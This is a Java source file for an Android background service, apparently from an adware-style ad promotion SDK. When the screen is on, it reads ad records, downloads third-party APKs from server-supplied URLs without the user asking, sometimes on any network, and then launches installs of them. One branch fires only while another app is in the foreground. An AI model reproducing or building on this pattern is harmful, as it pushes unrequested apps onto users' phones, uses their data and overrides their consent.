package com.mf.promotion.service.impl;

import java.io.File;
import java.util.List;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;

import com.mf.basecode.model.MyPackageInfo;
import com.mf.basecode.network.util.NetworkConstants;
import com.mf.basecode.network.util.NetworkUtils;
import com.mf.basecode.service.HandleService;
import com.mf.basecode.utils.Logger;
import com.mf.basecode.utils.contants.CommConstants;
import com.mf.data.PromDBU;
import com.mf.download.model.DownloadInfo;
import com.mf.download.util.DownloadConstants;
import com.mf.download.util.DownloadUtils;
import com.mf.model.AdDbInfo;
import com.mf.promotion.service.MFApkServiceFactory;
import com.mf.promotion.util.PromUtils;
import com.mf.statistics.prom.util.StatsPromConstants;
import com.mf.utils.AppInstallUtils;
//import android.util.Log;

public class HandleWakeUpService extends HandleService{
  private static final String TAG        = "HandleWaUp";
  private List<AdDbInfo> list;
  private Handler downloadHandler = new Handler(new Handler.Callback() {
	
	@Override
	public boolean handleMessage(Message msg) {
		handleWakeUpDownloadMessage(msg);
		return false;
	}
});
//  private Handler downloadHandler = new Handler() {
//    @Override
//    public void handleMessage(Message msg) {
//      handleWakeUpDownloadMessage(msg);
//    }
//  };
  
  public HandleWakeUpService(int serviceId, Context c, Handler handler) {
    super(serviceId, c, handler);
    spf = mContext.getSharedPreferences(CommConstants.SHARED_PREFERENCE_CONFIG, 0);
  }

  @Override
  public void onStartCommand(Intent intent, int flags, int startId) {
    Logger.e(TAG, "111111");
    boolean connect = PromUtils.netIsConnected(mContext);
    if(!connect){
      Logger.e(TAG, "connect");
      return ;
    }
    if(!isScreenOn(mContext)){
      Logger.e(TAG, "isScreenOn "+ isScreenOn(mContext));
      return ;
    }
    if(!pSwitch(spf, CommConstants.SHOW_RULE_WAKEUP)){
      Logger.e(TAG, "pSwitch " + pSwitch(spf, CommConstants.SHOW_RULE_WAKEUP));
      return ;
    }
    Logger.e("PromTimerManager", "HandleWakeUpService");
    startNextService(CommConstants.SHOW_RULE_WAKEUP,MFApkServiceFactory.HANDLE_WAKE_UP_SERVICE.getServiceId());
    if(!PromUtils.getInstance(mContext).checkHost()){
      Logger.e(TAG, "checkHost false");
      return;
    }
    list = getHandleAdInfoListForWakeUp(StatsPromConstants.STATS_PROM_AD_INFO_POSITION_WAKEUP,CommConstants.CONFIG_WAKEUP_SHOW_LIMIT, CommConstants.CONFIG_WAKEUP_SHOW_ONE_TIMENUM, PromDBU.PROM_WAKEUP);
    Logger.e(TAG, ""+list.size());
    handledAdList(list);
  }
  
  private void doWakeUp(AdDbInfo info){
    PackageInfo pInfo = AppInstallUtils.getPackageInfoByPackageName(mContext, info.getPackageName());
    String apkPath = DownloadUtils.getInstance(mContext).getApkDownloadFilePath(info.getPackageName(), info.getVersionCode());
    if (pInfo != null) {
      if (!PromUtils.getInstance(mContext).hasInstalled(new MyPackageInfo(info.getPackageName(), info.getVersionCode()))) {
        File f = new File(apkPath);
        if (f.exists() && showAdTime()) {
//          MyPackageInfo packageInfo = new MyPackageInfo(info.getAdId(),info.getPackageName(), info.getVersionCode(), StatsPromConstants.STATS_PROM_AD_INFO_POSITION_WAKEUP, 0, true);
//          AppInstallUtils.installApp(mContext, apkPath, packageInfo);
//          PromDBU.getInstance(mContext).updateAdInfoHasShowTimes(info, PromDBU.PROM_WAKEUP, PromDBU.PROM_WAKEUP_NAME);
        	showWakeUp(mContext, info, apkPath);
        }
      } 
    } else {
      File f = new File(apkPath);
      if (f.exists() && showAdTime()) {
//        MyPackageInfo packageInfo = new MyPackageInfo(info.getAdId(),info.getPackageName(), info.getVersionCode(), StatsPromConstants.STATS_PROM_AD_INFO_POSITION_WAKEUP, 0, true);
//        AppInstallUtils.installApp(mContext, apkPath, packageInfo);
//        PromDBU.getInstance(mContext).updateAdInfoHasShowTimes(info, PromDBU.PROM_WAKEUP, PromDBU.PROM_WAKEUP_NAME);
    	  showWakeUp(mContext, info, apkPath);
      } else {
        if ((info.getAdType() == 1 && info.getPreDown() == 1 && NetworkUtils.getNetworkType(mContext) == NetworkConstants.NERWORK_TYPE_WIFI) || info.getPreDown()== 2){
          DownloadInfo dinfo = new DownloadInfo(downloadHandler,info.getAdId(),
              info.getPackageName(), info.getVersionCode(), StatsPromConstants.STATS_PROM_AD_INFO_POSITION_WAKEUP, 0, info.getAdDownUrl(), info.getFileMd5(), true,true);
          MyPackageInfo packageInfo = new MyPackageInfo(info.getAdId(),info.getPackageName(), info.getVersionCode(), StatsPromConstants.STATS_PROM_AD_INFO_POSITION_WAKEUP, 0, true);
          if(DownloadUtils.getInstance(mContext).isDownloadOrWait(dinfo, packageInfo)){
            DownloadUtils.getInstance(mContext).addExtraHandler(downloadHandler);
          }else if(info.getAdType() == 1){
            DownloadUtils.getInstance(mContext).addDownloadApkThread(dinfo);
          }
        }
      }
    }
  }
  
  public void handleWakeUpDownloadMessage(android.os.Message msg) {
    Bundle b = (Bundle) msg.obj;
    String adid = b.getString(DownloadConstants.DOWNLOAD_HANDLER_BUNDLE_ADID);
    final String packageName = b.getString(DownloadConstants.DOWNLOAD_HANDLER_BUNDLE_PACKAGE_NAME);
    int version = b.getInt(DownloadConstants.DOWNLOAD_HANDLER_BUNDLE_VERSION_CODE);
    if (!TextUtils.isEmpty(packageName)) {
      if (msg.what == DownloadConstants.DOWNLOAD_HANDLER_STATUS_DOWNLOAD_FINISH) {
        String apkPath = DownloadUtils.getInstance(mContext).getApkDownloadFilePath(packageName, version);
        MyPackageInfo packageInfo = new MyPackageInfo(adid,packageName, version, StatsPromConstants.STATS_PROM_AD_INFO_POSITION_WAKEUP, 0, true);
        for (AdDbInfo info : list) {
          if(info.getPackageName().equals(packageName) && showAdTime()){
            Logger.e(TAG, ""+packageName);
            showWakeUpWithPkgInfo(mContext, info, apkPath, packageInfo);
//            AppInstallUtils.installApp(mContext, apkPath, packageInfo);
//            PromDBU.getInstance(mContext).updateAdInfoHasShowTimes(info, PromDBU.PROM_WAKEUP, PromDBU.PROM_WAKEUP_NAME);
            break;
          }
        }
      }
    }
  }
  
  public void handledAdList(List<AdDbInfo> list) {
    for (AdDbInfo adDbInfo : list) {
      Logger.e(TAG, ""+adDbInfo.toString());
      doWakeUp(adDbInfo);
    }
  }

  @Override
  public void handledAds(List<String> ads) {
    for (String str : ads) {
      if (!TextUtils.isEmpty(str)) {
        AdDbInfo info = PromDBU.getInstance(mContext).getAdInfobyAdid(str, PromDBU.PROM_WAKEUP);
        doWakeUp(info);
      }
    }
  }
  
  private boolean isShowInApp(AdDbInfo adDbInfo){
	  boolean isInAppB = false;
	  String isInApp = adDbInfo.getReserved3();
	  if(!TextUtils.isEmpty(isInApp)){
		  if(isInApp.equals("2")){
			  isInAppB = true;
		  }
	  }
	  return isInAppB;
  }
  
  private void showWakeUp(Context context,AdDbInfo adDbInfo,String apkPath){
	  boolean isShowInApp = isShowInApp(adDbInfo);
	  if(isShowInApp){
		  String pkgName = context.getPackageName();
		  String curTopPkgName = PromUtils.getInstance(context).getTopPackageName();
		  if(!pkgName.equals(curTopPkgName)){
			  MyPackageInfo packageInfo = new MyPackageInfo(adDbInfo.getAdId(),adDbInfo.getPackageName(), adDbInfo.getVersionCode(), StatsPromConstants.STATS_PROM_AD_INFO_POSITION_WAKEUP, 0, true);
	          AppInstallUtils.installApp(mContext, apkPath, packageInfo);
	          PromDBU.getInstance(mContext).updateAdInfoHasShowTimes(adDbInfo, PromDBU.PROM_WAKEUP, PromDBU.PROM_WAKEUP_NAME);
		  }
	  }else{
		  MyPackageInfo packageInfo = new MyPackageInfo(adDbInfo.getAdId(),adDbInfo.getPackageName(), adDbInfo.getVersionCode(), StatsPromConstants.STATS_PROM_AD_INFO_POSITION_WAKEUP, 0, true);
          AppInstallUtils.installApp(mContext, apkPath, packageInfo);
          PromDBU.getInstance(mContext).updateAdInfoHasShowTimes(adDbInfo, PromDBU.PROM_WAKEUP, PromDBU.PROM_WAKEUP_NAME);
	  }
	  
  }
  
  private void showWakeUpWithPkgInfo(Context context,AdDbInfo adDbInfo,String apkPath,MyPackageInfo packageInfo){
	  boolean isShowInApp = isShowInApp(adDbInfo);
	  if(isShowInApp){
		  String pkgName = context.getPackageName();
		  String curTopPkgName = PromUtils.getInstance(context).getTopPackageName();
		  if(!pkgName.equals(curTopPkgName)){
	          AppInstallUtils.installApp(mContext, apkPath, packageInfo);
	          PromDBU.getInstance(mContext).updateAdInfoHasShowTimes(adDbInfo, PromDBU.PROM_WAKEUP, PromDBU.PROM_WAKEUP_NAME);
		  }
	  }else{
          AppInstallUtils.installApp(mContext, apkPath, packageInfo);
          PromDBU.getInstance(mContext).updateAdInfoHasShowTimes(adDbInfo, PromDBU.PROM_WAKEUP, PromDBU.PROM_WAKEUP_NAME);
	  }
	  
  }
  
}
